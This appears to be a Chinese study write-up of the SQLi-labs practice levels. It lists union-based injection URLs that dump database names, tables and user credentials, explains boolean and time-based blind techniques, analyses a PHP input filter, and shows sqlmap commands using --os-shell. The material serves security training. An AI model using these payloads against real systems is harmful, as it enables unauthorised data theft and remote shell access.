#### Less1

**类型**：基于报错的 字符型 联合注入

#### Less2

**类型**：基于报错的 数字型 联合注入

http://192.168.170.128/sql/Less-2/?id=1

http://192.168.170.128/sql/Less-2/?id=1'

http://192.168.170.128/sql/Less-2/?id=1"

http://192.168.170.128/sql/Less-2/?id=1 union select 1,concat_ws(',',@@datadir,@@version_compile_os,version(),user(),database()),3 order by 1--+

-- 判断注入点和注入类型

http://192.168.170.128/sql/Less-2/?id=1 union select 0,group_concat(schema_name),3 from information_schema.schemata order by 1--+

http://192.168.170.128/sql/Less-2/?id=1 union select 0,group_concat(table_name),3 from information_schema.tables where table_schema='security' order by 1--+

http://192.168.170.128/sql/Less-2/?id=1 union select 0,group_concat(column_name),3 from information_schema.columns where table_name='users' order by 1--+

-- 三板斧

http://192.168.170.128/sql/Less-2/?id=1 union select 0,group_concat(username),3 from security.users order by 1--+

http://192.168.170.128/sql/Less-2/?id=1 union select 0,concat_ws(';',group_concat(username),group_concat(password)),3 from security.users order by 1--+

-- 爆库

#### Less3

#### Less4

和Less1类似，只不过sql语句在查询时在条件id=后的内容用括号或者其他字符括起来。注意括号在引号内部还是外部。

#### Less5

* **类型**：盲注 三种类型的盲注都可以实现

#### Less6

与Less5类似

#### Less7

* **类型**：基于file权限的注入

#### Less8

* **类型**：盲注 基于布尔或者时间的注入

![image-20230324174500065](.\images\sqli-lab过关.md)

正常查询没有回显结果

![image-20230324174642916](.\images\image-20230324174642916.png)

![image-20230324174711812](.\images\image-20230324174711812.png)

分别加单双引号可以确定是字符型注入,且是单引号闭合,而且没有sql查询结果的回显

![image-20230324203101514](.\images\image-20230324203101514.png)

假设一个比较离谱的id,但不使sql报错,说明没有查询结果时也没有回显。由此总结，注入点id是字符型单引号注入，没有错误回显，不过sql查询成功或者失败回显不同，可以使用布尔注入。

![image-20230324202950869](.\images\image-20230324202950869.png)

![image-20230324203020208](.\images\image-20230324203020208.png)

可以看到布尔注入成功，可以判端数据库名称的长度，还可以借助regexp、like、in等关键字判断其具体的字母

![image-20230324204907889](.\images\image-20230324204907889.png)

![image-20230324204936084](.\images\image-20230324204936084.png)

为报数据库名做准备，确定哪些是非系统数据库。

![image-20230324205112721](.\images\image-20230324205112721.png)

![image-20230324205157951](.\images\image-20230324205157951.png)

![image-20230324205225262](.\images\image-20230324205225262.png)

![image-20230324205324622](.\images\image-20230324205324622.png)

![image-20230324205404184](.\images\image-20230324205404184.png)

以上面确定的第二个非系统数据库为例，我们二分查找确定了其第一个字母是c。后面字母的查找和其他数据库、表、字段名的查询与此类似。

#### Less9

* **类型**：字符型的 基于时间的 注入

![image-20230324215124190](.\images\image-20230324215124190.png)

![image-20230324215157763](.\images\image-20230324215157763.png)

![image-20230324215224891](.\images\image-20230324215224891.png)

正常输入，单双引号返回的页面都相同

![image-20230324215444373](.\images\image-20230324215444373.png)

双引号闭合加or sleep(1)，较短时间返回，说明注入失败

![image-20230324215344698](.\images\image-20230324215344698.png)

输入单引号闭合加or sleep(1),校长时间返回，说明注入成功

![image-20230324215641284](.\images\image-20230324215641284.png)

返回速度较快，users()的第一个字母在a~z之间

![image-20230324215934354](.\images\image-20230324215934354.png)

返回慢,说明user()第一个字母不在a~m之间

![image-20230324220015273](.\images\image-20230324220015273.png)

返回快,说明user()第一个字母在m~z之间,其他操作与之类似

#### Less10

* 字符型 基于时间的注入

#### Less11

* 字符型 联合注入 post表单注入

#### Less12

* 字符型 联合注入 post表单注入

#### Less17

* 字符型 报错注入/时间注入 过滤函数

```php
function check_input($con1, $value)
{
        if(!empty($value))
        {
                // 限制post参数长度在15内
                $value = substr($value,0,15);
        }

        // php设置中有一个功能，为用户输入的 ‘ " \ 空字符增加反斜杠
    	// 该功能在早期php版本中默认开启，7.4.0版本后弃用，8.0.0后移除
        if (get_magic_quotes_gpc())
        {
            	// 除去字符串的反斜杠，\\则变为\
                $value = stripslashes($value);
        }

        // 检测是否为数字
        if (!ctype_digit($value))
        {
            	// 考虑连接的字符集，对于一些敏感字符进行转义
            	// 敏感字符须要在服务器配置中设置，或通过API函数mysqli_set_charset()设置
                $value = "'" . mysqli_real_escape_string($con1, $value) . "'";
        }
        else
        {
            	// intval获取变量的整型值
                $value = intval($value);
        }
        return $value;
}
```

但是该过滤函数仅对uname进行过滤，仍可以对passwd进行注入。

* **报错注入**：注意这里的报错信息，由update语句产生，请注意update的限制（例如字符串长度），有些select的报错在update下需要一些变化才能成功

* 这一题很简单，其实也很有意思，**因为这一题无法直接使用sqlmap**，这一题的注入语句为UPDATE users SET password = '' WHERE username=''，注入点在password处而不再where后

* **布尔盲注**：这里有两个思路

  * 利用set= and 的逻辑运算值 [关于upodate table set column=value1 and  其他条件 where 中set后的and运算][https://www.cnblogs.com/liaowenhui/p/14322765.html]

    ![](C:\Users\Administrator\Desktop\安全\Web\SQL\实例\sqli-lab\images\image-20230417213432099.png)

​				这里注入成功了，然后可以看到数据库变成了

​						![image-20230417213906122](.\images\image-20230417213906122.png)

​				将这里的1=1换成别的语句即可进行布尔盲注，验证过程是在前端页面进行密码登录验证，这是个思路，这里需要结合别的输入用户名和密码的关卡进行验证。

* 另一个思路是构造where及后面的语句，这样基于时间的报错也可使用了

  ![image-20230417214512568](.\images\image-20230417214512568.png)

​	这里可以看到页面返回有延迟，时间盲注成功

#### Less18

* 需要登录 头部注入（user-agent） insert注入 延时/报错、布尔都可

#### 17、18、19等部分关卡有关sqlmap不能成功拿shell的分析

17是update语句的注入，18是insert语句的注入，而sqlmap写木马的默认语句是基于outfile的，只能用于select，自然不能获得shell，其他的也类似

#### Less20-22

* sqlmap -u "http://localhost/sql/Less-21/"  --level=5 --cookie="uname=admin" -p 'uname' --os-shell 
* sqlmap -u "http://localhost/sql/Less-21/"  --level=5 --cookie="uname=admin" -p 'uname' --os-shell --tamper base64encode.py
* 略

#### Less23

* 字符型 报错注入/联合注入 过滤#和--

​	这里无法使用注释符，使用联合注入时需要注意union后的select语句要将单引号闭合

![image-20230612190048480](.\images\image-20230612190048480.png)

而且这里同样无法通过sqlmap拿shell

#### Less24

* 二次注入

#### Less25

* 过滤or and

#### Less26a

* 类似25

#### Less26
